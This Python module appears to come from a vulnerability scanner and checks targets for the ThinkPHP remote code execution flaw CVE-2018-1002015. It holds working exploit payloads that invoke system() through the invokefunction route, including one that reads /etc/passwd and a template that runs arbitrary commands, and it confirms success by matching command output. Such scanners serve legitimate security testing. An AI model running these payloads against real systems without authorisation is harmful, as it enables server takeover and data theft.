#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5
from lib.tool import check

cve_2018_1002015_payloads = [
    {
        'path': 'index.php?s=index/\\think\\Container/invokefunction',
        'data': 'function=call_user_func_array&vars[0]=system&vars[1][]={RCECOMMAND}',
    },
    {
        'path': 'index.php?s=index/\\think\\Container/invokefunction',
        'data': 'function=call_user_func_array&vars[0]=system&vars[1][]=cat /etc/passwd',
    },
    {
        'path': 'index.php?s=index/\\think\\Container/invokefunction',
        'data': 'function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1',
    }
]

def cve_2018_1002015_scan(clients):
    ''' ThinkPHP 5.0.23及5.1.31以下版本RCE
        ThinkPHP 5.0.x版本和5.1.x版本中存在远程代码执行漏洞, 
        该漏洞源于ThinkPHP在获取控制器名时未对用户提交的参数进行严格的过滤,
        远程攻击者可通过输入字符 \ 的方式调用任意方法利用该漏洞执行代码
    '''
    client = clients.get('reqClient')

    vul_info = {
        'app_name': 'ThinkPHP',
        'vul_type': 'RCE',
        'vul_id': 'CVE-2018-1002015',
    }

    for payload in cve_2018_1002015_payloads:
        randomStr = random_md5(6)
        RCEcommand = 'echo ' + randomStr
        
        path = payload['path']
        data = payload['data'].format(RCECOMMAND=RCEcommand)

        res = client.request(
            'post',
            path,
            data=data,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (check.check_res(res.text, randomStr)
            or check.check_res_fileread(res.text)
            or (('PHP Version' in res.text) 
                and ('PHP License' in res.text))
        ):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
